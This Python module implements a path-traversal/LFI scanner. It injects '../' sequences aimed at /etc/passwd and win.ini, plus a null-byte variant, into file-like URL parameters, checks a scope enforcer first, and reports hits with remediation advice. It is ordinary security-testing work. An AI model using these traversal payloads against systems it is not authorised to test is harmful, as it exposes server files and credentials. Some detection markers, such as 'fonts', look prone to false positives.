import urllib.parse

from crawler import Asset
from database import Vulnerability
from enforcer import ScopeEnforcer, safe_http_request


class LFIScanner:
    """
    Actively tests URL parameters for Path Traversal / Local File
    Inclusion (LFI) by injecting classic traversal payloads and checking
    the response for contents of well-known system files.
    """

    FILE_PARAM_HINTS = ["file", "filename", "path", "doc", "page", "include"]

    LINUX_MARKERS = ["root:", "daemon:"]
    WINDOWS_MARKERS = ["[extensions]", "fonts"]

    def __init__(self, enforcer: ScopeEnforcer):
        self.enforcer = enforcer
        # The web root's nesting depth is unknowable ahead of time (a shallow
        # project checkout vs. a deeply-nested temp/build directory can differ
        # by many levels), so probe a realistic range of "../" repetitions
        # rather than a couple of fixed guesses that only work for shallow paths.
        depths = range(3, 11)
        self.payloads = (
            [("../" * d) + "etc/passwd" for d in depths] +
            [("..\\" * d) + "Windows\\win.ini" for d in depths] +
            # Bypass filters (using forward slashes on Windows sometimes works)
            [("../" * d) + "Windows/win.ini" for d in depths] +
            [
                # Null byte injection (older servers)
                "../../../../../etc/passwd%00",
                # Reading the application's own source code (guaranteed to exist)
                "main.py",
                "local_target.py",
            ]
        )

    def scan(self, assets: list[Asset]) -> list[Vulnerability]:
        print("\n[*] Starting Path Traversal / LFI Scanner...")
        vulnerabilities: list[Vulnerability] = []

        urls_with_params = [a['url'] for a in assets if '?' in a['url']]
        print(f"[*] Found {len(urls_with_params)} URLs with parameters to test.")

        for url in urls_with_params:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)

            for param_name, original_values in query_params.items():
                if not any(hint in param_name.lower() for hint in self.FILE_PARAM_HINTS):
                    continue

                original_val = original_values[0]

                for payload in self.payloads:
                    test_query = parsed.query.replace(
                        f"{param_name}={original_val}",
                        f"{param_name}={urllib.parse.quote(payload)}"
                    )
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))

                    is_allowed, _ = self.enforcer.check(test_url)
                    if not is_allowed:
                        continue

                    print(f"    ↳ Testing LFI on: {param_name} with payload: {payload}")
                    response = safe_http_request(test_url, self.enforcer)
                    if response is None:
                        continue

                    body_lower = response.text.lower()
                    if any(marker in body_lower for marker in self.LINUX_MARKERS) or \
                       any(marker in body_lower for marker in self.WINDOWS_MARKERS):
                        vulnerabilities.append({
                            "type": "Path Traversal / Local File Inclusion (LFI)",
                            "severity": "CRITICAL",
                            "url": url,
                            "vulnerable_param": param_name,
                            "payload_used": payload,
                            "description": "The application allows reading arbitrary files from the server's filesystem by manipulating file path parameters.",
                            "remediation": "Never pass user input directly to file system APIs. Use an allow-list of permitted files, or implement strict input validation to reject path traversal characters like '../'."
                        })
                        break  # Move to the next parameter once a flaw is found

        print(f"[*] LFI scan complete. Found {len(vulnerabilities)} vulnerabilities.")
        return self._deduplicate(vulnerabilities)

    def _deduplicate(self, vulns: list[Vulnerability]) -> list[Vulnerability]:
        seen: set[tuple[str, str]] = set()
        unique_vulns: list[Vulnerability] = []
        for v in vulns:
            key = (v['url'], v['vulnerable_param'])
            if key not in seen:
                seen.add(key)
                unique_vulns.append(v)
        return unique_vulns
